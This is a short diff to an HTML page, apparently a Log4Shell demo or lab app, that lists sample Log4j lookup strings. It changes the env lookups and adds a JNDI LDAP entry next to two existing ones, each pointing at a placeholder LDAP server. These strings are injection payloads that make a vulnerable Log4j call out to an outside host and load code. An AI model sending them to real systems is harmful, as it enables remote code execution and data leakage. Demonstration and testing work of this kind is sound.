@@ -32,10 +32,10 @@
                             <li class="list-group-item">&#36;{sys:java.class.path}</li>
                             <li class="list-group-item">&#36;{sys:java.home}</li>
                             <li class="list-group-item">&#36;{log4j:configLocation}</li>
-                            <li class="list-group-item">&#36;{env:USER}</li>
-                            <li class="list-group-item">&#36;{docker:containerId}</li>
+                            <li class="list-group-item">&#36;{env:MODE}</li>
                             <li class="list-group-item">&#36;{jndi:ldap://${ldapaddr}:1389/a}</li>
                             <li class="list-group-item">&#36;{jndi:ldap://${ldapaddr}:1389/cn=version,dc=example,dc=org}</li>
+                            <li class="list-group-item">&#36;{jndi:ldap://${ldapaddr}:1389/cn=bogus}</li>
                         </ul>
                     </div>
                 </div>
